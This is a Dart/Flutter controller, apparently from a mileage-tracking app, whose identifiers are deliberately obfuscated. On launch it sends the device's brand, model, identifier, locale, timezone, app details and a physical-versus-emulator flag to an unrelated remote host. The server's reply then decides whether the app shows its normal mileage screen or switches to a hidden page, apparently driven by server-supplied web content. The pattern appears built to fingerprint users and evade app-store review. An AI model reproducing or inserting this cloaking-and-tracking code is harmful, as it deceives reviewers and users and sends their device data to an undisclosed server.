import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var nbumzwlf = RxBool(false);
  var srkcawbqlp = RxBool(true);
  var txlhqeb = RxString("");
  var conor = RxBool(false);
  var stanton = RxBool(true);
  final gkxqajmsip = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    yrxg();
  }


  Future<void> yrxg() async {

    conor.value = true;
    stanton.value = true;
    srkcawbqlp.value = false;

    gkxqajmsip.post("https://poi.miqiai.xyz/udehfikmxqrzbygwcpajnslvot",data: await rvoskdf()).then((value) {
      var adhj = value.data["adhj"] as String;
      var fvrkwnaq = value.data["fvrkwnaq"] as bool;
      if (fvrkwnaq) {
        txlhqeb.value = adhj;
        drew();
      } else {
        bins();
      }
    }).catchError((e) {
      srkcawbqlp.value = true;
      stanton.value = true;
      conor.value = false;
    });
  }

  Future<Map<String, dynamic>> rvoskdf() async {
    final DeviceInfoPlugin lzpadmgb = DeviceInfoPlugin();
    PackageInfo cqiumhe_pnkmr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vtghy = Platform.localeName;
    var gpwct = currentTimeZone;

    var rcwody = cqiumhe_pnkmr.packageName;
    var cilrv = cqiumhe_pnkmr.version;
    var djeo = cqiumhe_pnkmr.buildNumber;

    var pqedo = cqiumhe_pnkmr.appName;
    var vinceSporer = "";
    var ldvwh = "";
    var axesmlnz = "";
    var pudgf  = "";
    var bretTremblay = "";
    var duncanCassin = "";
    var rahulCassin = "";


    var dzfvxj = "";
    var bcuqfnwr = false;

    if (GetPlatform.isAndroid) {
      dzfvxj = "android";
      var bpyfkavqlg = await lzpadmgb.androidInfo;

      axesmlnz = bpyfkavqlg.brand;

      ldvwh  = bpyfkavqlg.model;
      pudgf = bpyfkavqlg.id;

      bcuqfnwr = bpyfkavqlg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dzfvxj = "ios";
      var pboraxq = await lzpadmgb.iosInfo;
      axesmlnz = pboraxq.name;
      ldvwh = pboraxq.model;

      pudgf = pboraxq.identifierForVendor ?? "";
      bcuqfnwr  = pboraxq.isPhysicalDevice;
    }
    var res = {
      "pqedo": pqedo,
      "pudgf": pudgf,
      "djeo": djeo,
      "rcwody": rcwody,
      "ldvwh": ldvwh,
      "cilrv": cilrv,
      "axesmlnz": axesmlnz,
      "vtghy": vtghy,
      "gpwct": gpwct,
      "dzfvxj": dzfvxj,
      "bcuqfnwr": bcuqfnwr,
      "rahulCassin" : rahulCassin,
      "vinceSporer" : vinceSporer,
      "bretTremblay" : bretTremblay,
      "duncanCassin" : duncanCassin,

    };
    return res;
  }

  Future<void> bins() async {
    Get.offAllNamed("/mileageTabPage");
  }

  Future<void> drew() async {
    Get.offAllNamed("/weight");
  }

}
